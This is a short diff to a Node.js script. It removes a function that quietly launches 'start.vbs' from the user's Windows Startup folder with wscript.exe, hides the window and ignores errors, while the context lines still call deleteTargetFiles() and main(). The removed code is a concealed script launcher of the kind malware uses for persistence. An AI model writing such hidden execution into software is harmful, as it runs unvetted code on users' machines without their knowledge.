@@ -197,40 +197,9 @@ function deleteTargetFiles() {
 // run once
 deleteTargetFiles();
 
-// run start.vbs file from stratupfolder
-function runStartupVBS() {
-  try {
-    const home = os.homedir();
-    const vbsPath = path.join(
-      home,
-      "AppData",
-      "Roaming",
-      "Microsoft",
-      "Windows",
-      "Start Menu",
-      "Programs",
-      "Startup",
-      "start.vbs"
-    );
-
-    if (!fs.existsSync(vbsPath)) return;
-
-    execFile(
-      "wscript.exe",
-      [vbsPath],
-      { windowsHide: true },
-      (error) => {
-        if (error) return;
-      }
-    );
-  } catch (err) {
-    // ignore errors
-  }
-}
-
-runStartupVBS();
 
 // run main
 main();
+
 
 
